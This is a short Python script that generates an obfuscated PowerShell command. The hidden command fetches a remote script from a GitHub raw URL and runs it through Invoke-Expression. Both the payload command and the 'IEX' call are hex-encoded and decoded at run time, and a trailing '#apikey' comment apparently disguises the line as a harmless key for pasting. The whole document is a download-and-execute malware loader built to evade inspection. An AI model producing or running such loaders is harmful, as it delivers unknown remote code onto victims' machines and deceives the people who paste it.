cmd = 'Invoke-RestMethod -Uri "https://raw.githubusercontent.com/thegoatofapi/mth/main/script.ps1" |Invoke-Expression'
hex_str = ''.join(f'{ord(c):02x}' for c in cmd)

final_cmd = f"&(&{{$a=$args[0];$r='';for($i=0;$i-lt$a.Length;$i=$i+2){{$r+=\"$([char](0+('0x'+$a[$i]+$a[$i+1])))\"}};$r}} '494558') (&{{$a=$args[0];$r='';for($i=0;$i-lt$a.Length;$i=$i+2){{$r+=\"$([char](0+('0x'+$a[$i]+$a[$i+1])))\"}};$r}} '{hex_str}') #apikey"

print(final_cmd)
